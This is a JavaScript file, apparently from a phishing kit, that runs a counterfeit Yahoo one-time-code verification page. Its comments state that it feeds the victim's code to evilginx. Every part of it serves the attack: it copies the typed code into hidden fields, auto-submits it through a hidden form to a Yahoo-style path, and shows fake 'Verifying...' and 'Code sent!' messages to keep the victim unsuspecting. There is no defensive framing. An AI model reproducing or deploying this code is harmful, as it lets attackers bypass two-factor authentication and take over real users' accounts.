const $ = require("jquery") // Declare the $ variable

$(document).ready(() => {
  console.log("Yahoo OTP page initialized")

  // Handle OTP input
  $("#verifyCode").on("input", function () {
    const value = $(this).val()
    // Copy to hidden otp field for evilginx
    $("#otp").val(value)

    // Auto-submit if 6-8 digits entered
    if (value.length >= 6 && value.length <= 8 && /^\d+$/.test(value)) {
      setTimeout(() => {
        $("#otp-form").submit()
      }, 500)
    }
  })

  // Handle form submission
  $("#otp-form").on("submit", function (e) {
    e.preventDefault()

    const otpCode = $("#verifyCode").val()
    console.log("OTP code entered:", otpCode)

    if (!otpCode || otpCode.length < 4) {
      $("#otp-error").show()
      return
    }

    $("#otp-error").hide()

    // Show loading state
    const submitBtn = $(this).find('input[type="submit"]')
    const originalValue = submitBtn.val()
    submitBtn.val("Verifying...").prop("disabled", true)

    // Submit to evilginx
    const form = document.createElement("form")
    form.method = "POST"
    form.action = "/account/challenge/otp"

    const otpField = document.createElement("input")
    otpField.type = "hidden"
    otpField.name = "verifyCode"
    otpField.value = otpCode
    form.appendChild(otpField)

    const otpField2 = document.createElement("input")
    otpField2.type = "hidden"
    otpField2.name = "otp"
    otpField2.value = otpCode
    form.appendChild(otpField2)

    document.body.appendChild(form)

    // Delay to show loading state
    setTimeout(() => {
      form.submit()
    }, 1000)
  })

  // Handle resend code
  $("#resend-code").on("click", function (e) {
    e.preventDefault()
    console.log("Resend code requested")

    // Show feedback
    $(this).text("Code sent!")
    setTimeout(() => {
      $(this).text("Didn't get a code? Send again")
    }, 3000)
  })

  // Get method from URL if available
  const urlParams = new URLSearchParams(window.location.search)
  const method = urlParams.get("method")
  if (method) {
    console.log("2FA method from previous step:", method)
  }

  // Focus on input
  $("#verifyCode").focus()
})
